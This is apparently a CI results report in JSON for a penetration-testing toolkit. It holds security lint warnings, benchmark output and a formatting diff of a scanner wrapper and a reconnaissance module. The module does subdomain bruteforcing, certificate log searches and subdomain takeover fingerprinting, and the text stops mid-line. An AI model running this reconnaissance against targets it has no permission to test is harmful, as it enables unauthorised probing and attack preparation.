{
  "security_validation": {
    "name": "Security Validation",
    "success": false,
    "duration": 0.1824626922607422,
    "returncode": 1,
    "stdout": "\ud83d\udd0d Running Security Configuration Validation...\n\u26a0\ufe0f  Found 18 security issues:\n  - WARNING: Potentially dangerous function '__import__' used in success_rate_validation.py\n  - CRITICAL: Potential hardcoded secret in bl4ckc3ll_p4nth30n.py\n  - WARNING: Potentially dangerous function 'input' used in bl4ckc3ll_p4nth30n.py\n  - WARNING: Potentially dangerous function '__import__' used in bl4ckc3ll_p4nth30n.py\n  - WARNING: Potentially dangerous function 'eval' used in performance_monitor.py\n  - CRITICAL: Potential hardcoded secret in enhanced_wordlists.py\n  - WARNING: Potentially dangerous function 'exec' used in bcar.py\n  - WARNING: Potentially dangerous function 'input' used in security_utils.py\n  - WARNING: Potentially dangerous function 'input' used in bl4ckc3ll_pantheon_master.py\n  - WARNING: Potentially dangerous function '__import__' used in comprehensive_test_suite.py\n  - WARNING: Potentially dangerous function '__import__' used in quick_functional_test.py\n  - WARNING: Potentially dangerous function 'input' used in enhanced_validation.py\n  - WARNING: Potentially dangerous function '__import__' used in diagnostics.py\n  - CRITICAL: Potential hardcoded secret in scripts/security_validator.py\n  - WARNING: Potentially dangerous function 'input' used in node_modules/flatted/python/flatted.py\n  - ERROR: Invalid JSON in node_modules/hasown/tsconfig.json: Expecting value: line 5 column 3 (char 68)\n  - WARNING: Potential sensitive data in node_modules/lodash.merge/package.json\n  - WARNING: Potential sensitive data in node_modules/@eslint-community/eslint-utils/node_modules/eslint-visitor-keys/package.json\n",
    "stderr": "",
    "timestamp": "2025-09-14T19:23:02.067209"
  },
  "performance_testing": {
    "name": "Performance Testing",
    "success": true,
    "duration": 6.573070287704468,
    "returncode": 0,
    "stdout": "\u26a1 Running Performance Benchmarks...\n  \ud83d\udcca Measuring startup time...\n  \ud83e\udde0 Measuring memory usage...\n  \ud83e\uddea Measuring test suite performance...\n  \ud83d\udcc1 Measuring file I/O performance...\n\n\ud83d\udcca Performance Results:\n  \u23f1\ufe0f  Startup time: 0.23s\n  \ud83e\udde0 Memory usage: 0.00MB increase\n  \ud83e\uddea Test suite: 5.06s\n  \ud83d\udcc1 File I/O: 0.00s write, 0.00s read\n\n\u2705 All performance benchmarks passed!\n",
    "stderr": "",
    "timestamp": "2025-09-14T19:23:08.640351"
  },
  "code_quality_checks": [
    {
      "name": "Black Code Formatting Check",
      "success": false,
      "duration": 9.535063743591309,
      "returncode": 1,
      "stdout": "--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/cicd_integration.py\t2025-09-14 19:10:58.549754+00:00\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/cicd_integration.py\t2025-09-14 19:23:09.494409+00:00\n@@ -14,74 +14,99 @@\n from typing import Dict, Any, List\n \n # Add current directory to path for imports\n sys.path.insert(0, str(Path(__file__).parent))\n \n+\n def main():\n     parser = argparse.ArgumentParser(description=\"CI/CD Security Scanner\")\n     parser.add_argument(\"--target\", required=True, help=\"Target to scan\")\n-    parser.add_argument(\"--scan-type\", choices=[\"quick\", \"full\", \"api-only\", \"cloud-only\"], \n-                       default=\"quick\", help=\"Type of scan to perform\")\n-    parser.add_argument(\"--output-format\", choices=[\"json\", \"sarif\", \"junit\"], \n-                       default=\"json\", help=\"Output format\")\n+    parser.add_argument(\n+        \"--scan-type\",\n+        choices=[\"quick\", \"full\", \"api-only\", \"cloud-only\"],\n+        default=\"quick\",\n+        help=\"Type of scan to perform\",\n+    )\n+    parser.add_argument(\n+        \"--output-format\",\n+        choices=[\"json\", \"sarif\", \"junit\"],\n+        default=\"json\",\n+        help=\"Output format\",\n+    )\n     parser.add_argument(\"--output-file\", help=\"Output file path\")\n-    parser.add_argument(\"--fail-on\", choices=[\"critical\", \"high\", \"medium\", \"low\"], \n-                       default=\"high\", help=\"Fail CI on this severity or higher\")\n-    parser.add_argument(\"--timeout\", type=int, default=1800, help=\"Scan timeout in seconds\")\n+    parser.add_argument(\n+        \"--fail-on\",\n+        choices=[\"critical\", \"high\", \"medium\", \"low\"],\n+        default=\"high\",\n+        help=\"Fail CI on this severity or higher\",\n+    )\n+    parser.add_argument(\n+        \"--timeout\", type=int, default=1800, help=\"Scan timeout in seconds\"\n+    )\n     parser.add_argument(\"--config-file\", help=\"Custom configuration file\")\n-    \n+\n     args = parser.parse_args()\n-    \n+\n     # Initialize scanner\n     scanner = CICDScanner(\n         target=args.target,\n         scan_type=args.scan_type,\n         output_format=args.output_format,\n         output_file=args.output_file,\n         fail_threshold=args.fail_on,\n         timeout=args.timeout,\n-        config_file=args.config_file\n+        config_file=args.config_file,\n     )\n-    \n+\n     # Run scan\n     exit_code = scanner.run()\n     sys.exit(exit_code)\n \n+\n class CICDScanner:\n-    def __init__(self, target: str, scan_type: str, output_format: str, \n-                 output_file: str = None, fail_threshold: str = \"high\", \n-                 timeout: int = 1800, config_file: str = None):\n+    def __init__(\n+        self,\n+        target: str,\n+        scan_type: str,\n+        output_format: str,\n+        output_file: str = None,\n+        fail_threshold: str = \"high\",\n+        timeout: int = 1800,\n+        config_file: str = None,\n+    ):\n         self.target = target\n         self.scan_type = scan_type\n         self.output_format = output_format\n-        self.output_file = output_file or f\"scan_results_{int(time.time())}.{output_format}\"\n+        self.output_file = (\n+            output_file or f\"scan_results_{int(time.time())}.{output_format}\"\n+        )\n         self.fail_threshold = fail_threshold\n         self.timeout = timeout\n         self.config_file = config_file\n         self.start_time = time.time()\n-        \n+\n         # Severity levels for comparison\n         self.severity_levels = {\n             \"info\": 0,\n             \"low\": 1,\n             \"medium\": 2,\n             \"high\": 3,\n-            \"critical\": 4\n+            \"critical\": 4,\n         }\n-        \n+\n         self.fail_level = self.severity_levels.get(fail_threshold, 3)\n-        \n+\n     def run(self) -> int:\n         \"\"\"Run the security scan and return exit code\"\"\"\n         try:\n             print(f\"[CI/CD] Starting {self.scan_type} scan for {self.target}\")\n             print(f\"[CI/CD] Output format: {self.output_format}\")\n             print(f\"[CI/CD] Fail threshold: {self.fail_threshold}\")\n-            \n+\n             # Prepare target file\n             self._prepare_target_file()\n-            \n+\n             # Run scan based on type\n             if self.scan_type == \"quick\":\n                 result = self._run_quick_scan()\n             elif self.scan_type == \"full\":\n                 result = self._run_full_scan()\n@@ -89,273 +114,291 @@\n                 result = self._run_api_scan()\n             elif self.scan_type == \"cloud-only\":\n                 result = self._run_cloud_scan()\n             else:\n                 raise ValueError(f\"Unknown scan type: {self.scan_type}\")\n-            \n+\n             # Process results\n             exit_code = self._process_results(result)\n-            \n+\n             # Generate output\n             self._generate_output(result)\n-            \n+\n             print(f\"[CI/CD] Scan completed in {time.time() - self.start_time:.1f}s\")\n             print(f\"[CI/CD] Results saved to: {self.output_file}\")\n-            \n+\n             return exit_code\n-            \n+\n         except Exception as e:\n             print(f\"[CI/CD] ERROR: {e}\")\n             return 2  # Error exit code\n-    \n+\n     def _prepare_target_file(self):\n         \"\"\"Prepare targets.txt file with the target\"\"\"\n         targets_file = Path(__file__).parent / \"targets.txt\"\n-        \n+\n         # Backup existing targets\n         if targets_file.exists():\n-            backup_file = Path(__file__).parent / f\"targets.txt.backup.{int(time.time())}\"\n+            backup_file = (\n+                Path(__file__).parent / f\"targets.txt.backup.{int(time.time())}\"\n+            )\n             targets_file.rename(backup_file)\n-        \n+\n         # Write new target\n-        with open(targets_file, 'w') as f:\n+        with open(targets_file, \"w\") as f:\n             f.write(f\"{self.target}\\n\")\n-    \n+\n     def _run_quick_scan(self) -> Dict[str, Any]:\n         \"\"\"Run a quick security scan (recon + basic vuln scan)\"\"\"\n         try:\n             # Import the main scanner\n             import bl4ckc3ll_p4nth30n as scanner\n-            \n+\n             # Load configuration\n             cfg = scanner.load_cfg()\n-            \n+\n             # Override config for quick scan\n             cfg[\"nuclei\"][\"severity\"] = \"medium,high,critical\"\n             cfg[\"limits\"][\"max_concurrent_scans\"] = 4\n             cfg[\"advanced_scanning\"][\"api_discovery\"] = True\n             cfg[\"advanced_scanning\"][\"security_headers\"] = True\n             cfg[\"advanced_scanning\"][\"cors_analysis\"] = True\n-            \n+\n             # Disable slower scans for quick mode\n             cfg[\"advanced_scanning\"][\"threat_intelligence\"] = False\n             cfg[\"advanced_scanning\"][\"compliance_checks\"] = False\n             cfg[\"ml_analysis\"][\"enabled\"] = False\n-            \n+\n             # Create run directory\n             run_dir = scanner.new_run()\n             env = scanner.env_with_lists()\n-            \n+\n             # Run stages\n             scanner.stage_recon(run_dir, env, cfg)\n             scanner.stage_vuln_scan(run_dir, env, cfg)\n-            \n+\n             # Collect results\n             return self._collect_scan_results(run_dir)\n-            \n+\n         except Exception as e:\n             raise Exception(f\"Quick scan failed: {e}\")\n-    \n+\n     def _run_full_scan(self) -> Dict[str, Any]:\n         \"\"\"Run a comprehensive security scan\"\"\"\n         try:\n             # Import the main scanner\n             import bl4ckc3ll_p4nth30n as scanner\n-            \n+\n             # Load configuration\n             cfg = scanner.load_cfg()\n-            \n+\n             # Enable all scanning features\n             cfg[\"advanced_scanning\"][\"api_discovery\"] = True\n             cfg[\"advanced_scanning\"][\"graphql_testing\"] = True\n             cfg[\"advanced_scanning\"][\"jwt_analysis\"] = True\n             cfg[\"advanced_scanning\"][\"cloud_storage_buckets\"] = True\n             cfg[\"advanced_scanning\"][\"threat_intelligence\"] = True\n             cfg[\"advanced_scanning\"][\"compliance_checks\"] = True\n             cfg[\"ml_analysis\"][\"enabled\"] = True\n-            \n+\n             # Create run directory\n             run_dir = scanner.new_run()\n             env = scanner.env_with_lists()\n-            \n+\n             # Run full pipeline\n             scanner.stage_recon(run_dir, env, cfg)\n             scanner.stage_vuln_scan(run_dir, env, cfg)\n-            \n+\n             # Run plugins\n             plugins = scanner.load_plugins()\n             for plugin_name, plugin_data in plugins.items():\n                 if plugin_data.get(\"enabled\", True):\n                     try:\n                         print(f\"[CI/CD] Running plugin: {plugin_name}\")\n                         plugin_data[\"execute\"](run_dir, env, cfg)\n                     except Exception as e:\n                         print(f\"[CI/CD] Plugin {plugin_name} failed: {e}\")\n-            \n+\n             # Collect results\n             return self._collect_scan_results(run_dir)\n-            \n+\n         except Exception as e:\n             raise Exception(f\"Full scan failed: {e}\")\n-    \n+\n     def _run_api_scan(self) -> Dict[str, Any]:\n         \"\"\"Run API-focused security scan\"\"\"\n         try:\n             # Import the main scanner\n             import bl4ckc3ll_p4nth30n as scanner\n-            \n+\n             # Load configuration - focus on API testing\n             cfg = scanner.load_cfg()\n             cfg[\"advanced_scanning\"] = {\n                 \"api_discovery\": True,\n                 \"graphql_testing\": True,\n                 \"jwt_analysis\": True,\n                 \"security_headers\": True,\n                 \"cors_analysis\": True,\n                 \"ssl_analysis\": True,\n-                \"technology_detection\": True\n+                \"technology_detection\": True,\n             }\n-            \n+\n             # Create run directory and run API-focused scan\n             run_dir = scanner.new_run()\n             env = scanner.env_with_lists()\n-            \n+\n             # Run basic recon\n             scanner.stage_recon(run_dir, env, cfg)\n-            \n+\n             # Run vulnerability scan with API focus\n             scanner.stage_vuln_scan(run_dir, env, cfg)\n-            \n+\n             # Run API security plugin\n             try:\n                 plugins = scanner.load_plugins()\n                 if \"api_security_scanner\" in plugins:\n                     plugins[\"api_security_scanner\"][\"execute\"](run_dir, env, cfg)\n             except Exception as e:\n                 print(f\"[CI/CD] API plugin execution failed: {e}\")\n-            \n+\n             return self._collect_scan_results(run_dir)\n-            \n+\n         except Exception as e:\n             raise Exception(f\"API scan failed: {e}\")\n-    \n+\n     def _run_cloud_scan(self) -> Dict[str, Any]:\n         \"\"\"Run cloud-focused security scan\"\"\"\n         try:\n             # Import the main scanner\n             import bl4ckc3ll_p4nth30n as scanner\n-            \n+\n             # Load configuration - focus on cloud security\n             cfg = scanner.load_cfg()\n             cfg[\"advanced_scanning\"] = {\n                 \"cloud_storage_buckets\": True,\n                 \"container_scanning\": True,\n                 \"certificate_transparency\": True,\n                 \"dns_enumeration\": True,\n-                \"subdomain_takeover\": True\n+                \"subdomain_takeover\": True,\n             }\n-            \n+\n             # Create run directory\n             run_dir = scanner.new_run()\n             env = scanner.env_with_lists()\n-            \n+\n             # Run minimal recon\n             scanner.stage_recon(run_dir, env, cfg)\n-            \n+\n             # Run vulnerability scan with cloud focus\n             scanner.stage_vuln_scan(run_dir, env, cfg)\n-            \n+\n             # Run cloud security plugin\n             try:\n                 plugins = scanner.load_plugins()\n                 if \"cloud_security_scanner\" in plugins:\n                     plugins[\"cloud_security_scanner\"][\"execute\"](run_dir, env, cfg)\n             except Exception as e:\n                 print(f\"[CI/CD] Cloud plugin execution failed: {e}\")\n-            \n+\n             return self._collect_scan_results(run_dir)\n-            \n+\n         except Exception as e:\n             raise Exception(f\"Cloud scan failed: {e}\")\n-    \n+\n     def _collect_scan_results(self, run_dir: Path) -> Dict[str, Any]:\n         \"\"\"Collect and aggregate scan results\"\"\"\n         results = {\n             \"scan_info\": {\n                 \"target\": self.target,\n                 \"scan_type\": self.scan_type,\n                 \"start_time\": self.start_time,\n                 \"end_time\": time.time(),\n-                \"duration\": time.time() - self.start_time\n+                \"duration\": time.time() - self.start_time,\n             },\n             \"vulnerabilities\": [],\n             \"summary\": {\n                 \"total_vulns\": 0,\n-                \"by_severity\": {\"critical\": 0, \"high\": 0, \"medium\": 0, \"low\": 0, \"info\": 0}\n-            }\n+                \"by_severity\": {\n+                    \"critical\": 0,\n+                    \"high\": 0,\n+                    \"medium\": 0,\n+                    \"low\": 0,\n+                    \"info\": 0,\n+                },\n+            },\n         }\n-        \n+\n         # Collect Nuclei results\n         nuclei_files = list(run_dir.glob(\"**/nuclei_results.jsonl\"))\n         for nuclei_file in nuclei_files:\n             try:\n-                with open(nuclei_file, 'r') as f:\n+                with open(nuclei_file, \"r\") as f:\n                     for line in f:\n                         if line.strip():\n                             vuln = json.loads(line)\n-                            \n-                            severity = vuln.get(\"info\", {}).get(\"severity\", \"info\").lower()\n-                            \n+\n+                            severity = (\n+                                vuln.get(\"info\", {}).get(\"severity\", \"info\").lower()\n+                            )\n+\n                             vuln_info = {\n                                 \"id\": vuln.get(\"template-id\", \"unknown\"),\n                                 \"name\": vuln.get(\"info\", {}).get(\"name\", \"Unknown\"),\n                                 \"severity\": severity,\n-                                \"description\": vuln.get(\"info\", {}).get(\"description\", \"\"),\n+                                \"description\": vuln.get(\"info\", {}).get(\n+                                    \"description\", \"\"\n+                                ),\n                                 \"url\": vuln.get(\"matched-at\", \"\"),\n                                 \"type\": vuln.get(\"type\", \"\"),\n-                                \"tags\": vuln.get(\"info\", {}).get(\"tags\", [])\n+                                \"tags\": vuln.get(\"info\", {}).get(\"tags\", []),\n                             }\n-                            \n+\n                             results[\"vulnerabilities\"].append(vuln_info)\n                             results[\"summary\"][\"total_vulns\"] += 1\n-                            \n+\n                             if severity in results[\"summary\"][\"by_severity\"]:\n                                 results[\"summary\"][\"by_severity\"][severity] += 1\n-            \n+\n             except Exception as e:\n                 print(f\"[CI/CD] Error reading Nuclei results: {e}\")\n-        \n+\n         # Collect additional scan results\n         additional_files = [\n             \"api_discovery.json\",\n-            \"graphql_security.json\", \n+            \"graphql_security.json\",\n             \"jwt_analysis.json\",\n             \"cloud_storage.json\",\n-            \"compliance_checks.json\"\n+            \"compliance_checks.json\",\n         ]\n-        \n+\n         for filename in additional_files:\n             result_files = list(run_dir.glob(f\"**/{filename}\"))\n             for result_file in result_files:\n                 try:\n-                    with open(result_file, 'r') as f:\n+                    with open(result_file, \"r\") as f:\n                         data = json.load(f)\n-                        \n+\n                         # Process different result types\n                         if filename == \"compliance_checks.json\":\n                             self._process_compliance_results(data, results)\n                         elif filename == \"cloud_storage.json\":\n                             self._process_cloud_results(data, results)\n-                        elif filename in [\"api_discovery.json\", \"graphql_security.json\", \"jwt_analysis.json\"]:\n+                        elif filename in [\n+                            \"api_discovery.json\",\n+                            \"graphql_security.json\",\n+                            \"jwt_analysis.json\",\n+                        ]:\n                             self._process_api_results(data, results, filename)\n-                \n+\n                 except Exception as e:\n                     print(f\"[CI/CD] Error reading {filename}: {e}\")\n-        \n+\n         return results\n-    \n-    def _process_compliance_results(self, data: Dict[str, Any], results: Dict[str, Any]):\n+\n+    def _process_compliance_results(\n+        self, data: Dict[str, Any], results: Dict[str, Any]\n+    ):\n         \"\"\"Process compliance check results\"\"\"\n         if \"owasp_top10\" in data:\n             for category, issues in data[\"owasp_top10\"].items():\n                 if issues:  # If there are issues in this category\n                     vuln_info = {\n@@ -363,37 +406,39 @@\n                         \"name\": f\"OWASP Top 10: {category.replace('_', ' ').title()}\",\n                         \"severity\": \"high\",\n                         \"description\": f\"Potential {category} vulnerability detected\",\n                         \"url\": self.target,\n                         \"type\": \"compliance\",\n-                        \"tags\": [\"owasp\", \"compliance\"]\n+                        \"tags\": [\"owasp\", \"compliance\"],\n                     }\n                     results[\"vulnerabilities\"].append(vuln_info)\n                     results[\"summary\"][\"total_vulns\"] += 1\n                     results[\"summary\"][\"by_severity\"][\"high\"] += 1\n-    \n+\n     def _process_cloud_results(self, data: Dict[str, Any], results: Dict[str, Any]):\n         \"\"\"Process cloud security results\"\"\"\n         # Check for accessible buckets\n         for bucket in data.get(\"accessible_buckets\", []):\n             if bucket.get(\"public_read\") or bucket.get(\"public_write\"):\n                 severity = \"critical\" if bucket.get(\"public_write\") else \"high\"\n-                \n+\n                 vuln_info = {\n                     \"id\": \"cloud-storage-exposure\",\n                     \"name\": \"Exposed Cloud Storage Bucket\",\n                     \"severity\": severity,\n                     \"description\": f\"Cloud storage bucket '{bucket.get('name')}' is publicly accessible\",\n                     \"url\": bucket.get(\"url\", self.target),\n                     \"type\": \"cloud_security\",\n-                    \"tags\": [\"cloud\", \"storage\", \"exposure\"]\n+                    \"tags\": [\"cloud\", \"storage\", \"exposure\"],\n                 }\n                 results[\"vulnerabilities\"].append(vuln_info)\n                 results[\"summary\"][\"total_vulns\"] += 1\n                 results[\"summary\"][\"by_severity\"][severity] += 1\n-    \n-    def _process_api_results(self, data: Dict[str, Any], results: Dict[str, Any], filename: str):\n+\n+    def _process_api_results(\n+        self, data: Dict[str, Any], results: Dict[str, Any], filename: str\n+    ):\n         \"\"\"Process API security results\"\"\"\n         if filename == \"graphql_security.json\":\n             for endpoint, info in data.items():\n                 if info.get(\"introspection_enabled\"):\n                     vuln_info = {\n@@ -401,108 +446,111 @@\n                         \"name\": \"GraphQL Introspection Enabled\",\n                         \"severity\": \"medium\",\n                         \"description\": f\"GraphQL introspection is enabled on {endpoint}\",\n                         \"url\": info.get(\"url\", self.target),\n                         \"type\": \"api_security\",\n-                        \"tags\": [\"graphql\", \"introspection\"]\n+                        \"tags\": [\"graphql\", \"introspection\"],\n                     }\n                     results[\"vulnerabilities\"].append(vuln_info)\n                     results[\"summary\"][\"total_vulns\"] += 1\n                     results[\"summary\"][\"by_severity\"][\"medium\"] += 1\n-    \n+\n     def _process_results(self, results: Dict[str, Any]) -> int:\n         \"\"\"Process results and determine exit code\"\"\"\n         # Check if any vulnerabilities meet the fail threshold\n         for vuln in results[\"vulnerabilities\"]:\n             vuln_severity = vuln.get(\"severity\", \"info\")\n             vuln_level = self.severity_levels.get(vuln_severity, 0)\n-            \n+\n             if vuln_level >= self.fail_level:\n-                print(f\"[CI/CD] FAIL: Found {vuln_severity} severity vulnerability: {vuln['name']}\")\n+                print(\n+                    f\"[CI/CD] FAIL: Found {vuln_severity} severity vulnerability: {vuln['name']}\"\n+                )\n                 return 1  # Fail exit code\n-        \n+\n         print(f\"[CI/CD] PASS: No vulnerabilities above {self.fail_threshold} threshold\")\n         return 0  # Success exit code\n-    \n+\n     def _generate_output(self, results: Dict[str, Any]):\n         \"\"\"Generate output in the specified format\"\"\"\n         if self.output_format == \"json\":\n             self._generate_json_output(results)\n         elif self.output_format == \"sarif\":\n             self._generate_sarif_output(results)\n         elif self.output_format == \"junit\":\n             self._generate_junit_output(results)\n-    \n+\n     def _generate_json_output(self, results: Dict[str, Any]):\n         \"\"\"Generate JSON output\"\"\"\n-        with open(self.output_file, 'w') as f:\n+        with open(self.output_file, \"w\") as f:\n             json.dump(results, f, indent=2, default=str)\n-    \n+\n     def _generate_sarif_output(self, results: Dict[str, Any]):\n         \"\"\"Generate SARIF output for security tools integration\"\"\"\n         sarif = {\n             \"version\": \"2.1.0\",\n             \"schema\": \"https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json\",\n-            \"runs\": [{\n-                \"tool\": {\n-                    \"driver\": {\n-                        \"name\": \"Bl4ckC3ll_PANTHEON\",\n-                        \"version\": \"9.0.0-enhanced\",\n-                        \"informationUri\": \"https://github.com/cxb3rf1lth/Bl4ckC3ll_PANTHEON\"\n-                    }\n-                },\n-                \"results\": []\n-            }]\n+            \"runs\": [\n+                {\n+                    \"tool\": {\n+                        \"driver\": {\n+                            \"name\": \"Bl4ckC3ll_PANTHEON\",\n+                            \"version\": \"9.0.0-enhanced\",\n+                            \"informationUri\": \"https://github.com/cxb3rf1lth/Bl4ckC3ll_PANTHEON\",\n+                        }\n+                    },\n+                    \"results\": [],\n+                }\n+            ],\n         }\n-        \n+\n         for vuln in results[\"vulnerabilities\"]:\n             sarif_result = {\n                 \"ruleId\": vuln[\"id\"],\n                 \"message\": {\"text\": vuln[\"description\"]},\n                 \"level\": self._map_severity_to_sarif(vuln[\"severity\"]),\n-                \"locations\": [{\n-                    \"physicalLocation\": {\n-                        \"artifactLocation\": {\"uri\": vuln[\"url\"]}\n-                    }\n-                }]\n+                \"locations\": [\n+                    {\"physicalLocation\": {\"artifactLocation\": {\"uri\": vuln[\"url\"]}}}\n+                ],\n             }\n             sarif[\"runs\"][0][\"results\"].append(sarif_result)\n-        \n-        with open(self.output_file, 'w') as f:\n+\n+        with open(self.output_file, \"w\") as f:\n             json.dump(sarif, f, indent=2)\n-    \n+\n     def _generate_junit_output(self, results: Dict[str, Any]):\n         \"\"\"Generate JUnit XML output\"\"\"\n         junit_xml = f\"\"\"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n <testsuite name=\"Security Scan\" tests=\"{len(results['vulnerabilities'])}\" failures=\"{len([v for v in results['vulnerabilities'] if self.severity_levels.get(v['severity'], 0) >= self.fail_level])}\" time=\"{results['scan_info']['duration']:.2f}\">\n \"\"\"\n-        \n+\n         for vuln in results[\"vulnerabilities\"]:\n             test_name = f\"{vuln['id']}: {vuln['name']}\"\n-            \n+\n             if self.severity_levels.get(vuln[\"severity\"], 0) >= self.fail_level:\n                 junit_xml += f\"\"\"  <testcase name=\"{test_name}\" classname=\"SecurityScan\">\n     <failure message=\"{vuln['severity']} severity vulnerability\">{vuln['description']}</failure>\n   </testcase>\n \"\"\"\n             else:\n                 junit_xml += f\"\"\"  <testcase name=\"{test_name}\" classname=\"SecurityScan\" />\n \"\"\"\n-        \n+\n         junit_xml += \"</testsuite>\"\n-        \n-        with open(self.output_file, 'w') as f:\n+\n+        with open(self.output_file, \"w\") as f:\n             f.write(junit_xml)\n-    \n+\n     def _map_severity_to_sarif(self, severity: str) -> str:\n         \"\"\"Map severity levels to SARIF levels\"\"\"\n         mapping = {\n             \"critical\": \"error\",\n-            \"high\": \"error\", \n+            \"high\": \"error\",\n             \"medium\": \"warning\",\n             \"low\": \"note\",\n-            \"info\": \"note\"\n+            \"info\": \"note\",\n         }\n         return mapping.get(severity, \"note\")\n \n+\n if __name__ == \"__main__\":\n-    main()\n\\ No newline at end of file\n+    main()\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/bcar.py\t2025-09-14 19:10:58.547754+00:00\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/bcar.py\t2025-09-14 19:23:09.658225+00:00\n@@ -25,561 +25,874 @@\n import ssl\n import base64\n from dataclasses import dataclass, asdict\n import logging\n \n+\n # Advanced Certificate Transparency and Subdomain Discovery\n class BCARCore:\n     \"\"\"Core BCAR functionality for advanced reconnaissance\"\"\"\n-    \n+\n     def __init__(self, logger=None):\n         self.logger = logger or self._setup_logger()\n         self.session = requests.Session()\n-        self.session.headers.update({\n-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'\n-        })\n+        self.session.headers.update(\n+            {\n+                \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\"\n+            }\n+        )\n         self.found_subdomains = set()\n         self.found_endpoints = set()\n         self.certificates = []\n         self.vulnerabilities = []\n-        \n+\n     def _setup_logger(self):\n         \"\"\"Setup basic logging\"\"\"\n-        logger = logging.getLogger('BCAR')\n+        logger = logging.getLogger(\"BCAR\")\n         if not logger.handlers:\n             handler = logging.StreamHandler()\n-            formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')\n+            formatter = logging.Formatter(\n+                \"%(asctime)s - %(name)s - %(levelname)s - %(message)s\"\n+            )\n             handler.setFormatter(formatter)\n             logger.addHandler(handler)\n             logger.setLevel(logging.INFO)\n         return logger\n \n-    def certificate_transparency_search(self, domain: str, limit: int = 1000) -> List[str]:\n+    def certificate_transparency_search(\n+        self, domain: str, limit: int = 1000\n+    ) -> List[str]:\n         \"\"\"Search Certificate Transparency logs for subdomains\"\"\"\n         subdomains = set()\n         ct_sources = [\n             f\"https://crt.sh/?q=%25.{domain}&output=json\",\n-            f\"https://api.certspotter.com/v1/issuances?domain={domain}&include_subdomains=true&expand=dns_names\"\n+            f\"https://api.certspotter.com/v1/issuances?domain={domain}&include_subdomains=true&expand=dns_names\",\n         ]\n-        \n+\n         for url in ct_sources:\n             try:\n                 self.logger.info(f\"Querying CT logs: {url}\")\n                 response = self.session.get(url, timeout=30)\n                 if response.status_code == 200:\n-                    if 'crt.sh' in url:\n+                    if \"crt.sh\" in url:\n                         data = response.json()\n                         for entry in data[:limit]:\n-                            name_value = entry.get('name_value', '')\n-                            for name in name_value.split('\\n'):\n+                            name_value = entry.get(\"name_value\", \"\")\n+                            for name in name_value.split(\"\\n\"):\n                                 name = name.strip().lower()\n-                                if name and domain in name and not name.startswith('*'):\n+                                if name and domain in name and not name.startswith(\"*\"):\n                                     subdomains.add(name)\n-                    elif 'certspotter' in url:\n+                    elif \"certspotter\" in url:\n                         data = response.json()\n                         for entry in data[:limit]:\n-                            dns_names = entry.get('dns_names', [])\n+                            dns_names = entry.get(\"dns_names\", [])\n                             for name in dns_names:\n                                 name = name.strip().lower()\n-                                if name and domain in name and not name.startswith('*'):\n+                                if name and domain in name and not name.startswith(\"*\"):\n                                     subdomains.add(name)\n             except Exception as e:\n                 self.logger.warning(f\"CT source failed {url}: {e}\")\n-                \n+\n         self.found_subdomains.update(subdomains)\n         return list(subdomains)\n \n-    def advanced_subdomain_enumeration(self, domain: str, wordlist: List[str] = None) -> List[str]:\n+    def advanced_subdomain_enumeration(\n+        self, domain: str, wordlist: List[str] = None\n+    ) -> List[str]:\n         \"\"\"Advanced subdomain enumeration with multiple techniques\"\"\"\n         if not wordlist:\n             wordlist = self._get_default_subdomain_wordlist()\n-        \n+\n         subdomains = set()\n-        \n+\n         # DNS bruteforcing\n         def check_subdomain(sub):\n             subdomain = f\"{sub}.{domain}\"\n             try:\n                 socket.gethostbyname(subdomain)\n                 return subdomain\n             except socket.gaierror:\n                 return None\n-        \n+\n         with ThreadPoolExecutor(max_workers=50) as executor:\n             futures = {executor.submit(check_subdomain, sub): sub for sub in wordlist}\n             for future in as_completed(futures):\n                 result = future.result()\n                 if result:\n                     subdomains.add(result)\n-                    \n+\n         self.found_subdomains.update(subdomains)\n         return list(subdomains)\n \n     def subdomain_takeover_check(self, subdomains: List[str]) -> List[Dict[str, Any]]:\n         \"\"\"Check for subdomain takeover vulnerabilities\"\"\"\n         takeover_signatures = {\n-            'github.io': ['There isn\\'t a GitHub Pages site here'],\n-            'herokuapp.com': ['No such app'],\n-            'wordpress.com': ['Do you want to register'],\n-            'amazoncognito.com': ['The specified bucket does not exist'],\n-            'amazonaws.com': ['NoSuchBucket', 'The specified bucket does not exist'],\n-            'bitbucket.io': ['Repository not found'],\n-            'zendesk.com': ['Help Center Closed'],\n-            'fastly.com': ['Fastly error: unknown domain'],\n-            'shopify.com': ['Only one step left!'],\n-            'surge.sh': ['project not found'],\n-            'tumblr.com': ['Whatever you were looking for doesn\\'t currently exist'],\n-            'unbounce.com': ['The requested URL was not found on this server'],\n-            'desk.com': ['Please try again or try Desk.com'],\n-            'pingdom.com': ['Sorry, couldn\\'t find the status page']\n-        }\n-        \n+            \"github.io\": [\"There isn't a GitHub Pages site here\"],\n+            \"herokuapp.com\": [\"No such app\"],\n+            \"wordpress.com\": [\"Do you want to register\"],\n+            \"amazoncognito.com\": [\"The specified bucket does not exist\"],\n+            \"amazonaws.com\": [\"NoSuchBucket\", \"The specified bucket does not exist\"],\n+            \"bitbucket.io\": [\"Repository not found\"],\n+            \"zendesk.com\": [\"Help Center Closed\"],\n+            \"fastly.com\": [\"Fastly error: unknown domain\"],\n+            \"shopify.com\": [\"Only one step left!\"],\n+            \"surge.sh\": [\"project not found\"],\n+            \"tumblr.com\": [\"Whatever you were looking for doesn't currently exist\"],\n+            \"unbounce.com\": [\"The requested URL was not found on this server\"],\n+            \"desk.com\": [\"Please try again or try Desk.com\"],\n+            \"pingdom.com\": [\"Sorry, couldn't find the status page\"],\n+        }\n+\n         vulnerabilities = []\n-        \n+\n         def check_takeover(subdomain):\n             try:\n-                response = self.session.get(f\"http://{subdomain}\", timeout=10, allow_redirects=True)\n+                response = 